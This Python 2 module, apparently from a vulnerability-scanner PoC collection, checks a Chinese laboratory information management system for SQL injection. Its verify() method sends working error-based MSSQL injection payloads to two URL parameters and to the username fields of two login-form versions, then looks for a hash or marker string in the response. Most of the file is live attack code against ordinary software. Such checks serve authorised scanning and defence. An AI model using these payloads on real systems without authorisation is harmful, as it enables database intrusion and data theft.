# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'SunData_0002' # 平台漏洞编号，留空
    name = '三唐实验室综合信息管理系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-07'  # 漏洞公布时间
    desc = '''
        三唐实验室综合信息管理系统 /AllInfor/Experiment_baseInfor.aspx?SYXH=1 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '三唐实验室综合信息管理系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a30b79fd-c78d-4a3d-9c20-8f2f8110b86b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            #No.1 http://www.wooyun.org/bugs/wooyun-2010-0105992
            payload = "/AllInfor/Experiment_baseInfor.aspx?SYXH=1%27%20and%201=convert(int,(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and%20%271%27=%271"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target);
            if 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            #No.2 http://www.wooyun.org/bugs/wooyun-2010-0105283
            payload = "/OpenTimsUI/STUMODEL/StuBookExpCell.aspx?codeID=1%27%20and%201=convert(int,(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and%20%271%27=%271"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target);
            if 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            #No.3 http://www.wooyun.org/bugs/wooyun-2010-0105279
            payload = "/defaultnew.aspx"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target);
            view = re.findall("id[\s\S]*=[\s\S]*\"__VIEWSTATE\"[\s\S]*value[\s\S]*=[\s\S]*\"([^<>]+)\" />", body)
            if len(view) == 0:
                view = re.findall("name[\s\S]*=[\s\S]*\"__VIEWSTATE\"[\s\S]*value[\s\S]*=[\s\S]*\"([^<>]+)\"", body)
            if len(view) == 0:
                return
            #v5.0
            _post = '__VIEWSTATE='+view[0]+'&txtUserName3=%27+and+1%3Dconvert%28int%2C%27hen%27%2B%27tai%27%29+and+%271%27%3D%271&txtPassword3=&ddlUserType3=0&btnLogin=%B5%C7+%C2%BC+'
            code, head, body, errcode, final_url = hh.http(target, post=_post);
            if 'hentai' in body:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                return
            #v4.0
            _post = '__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='+view[0]+'&UserName=%27%29+and+1%3Dconvert%28int%2C%27hen%27%2B%27tai%27%29+and+%28%271%27%3D%271&PassWord=123&Submit.x=43&Submit.y=12&radiobutton=R2'
            code, head, body, errcode, final_url = hh.http(target, post=_post);
            if 'hentai' in body:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
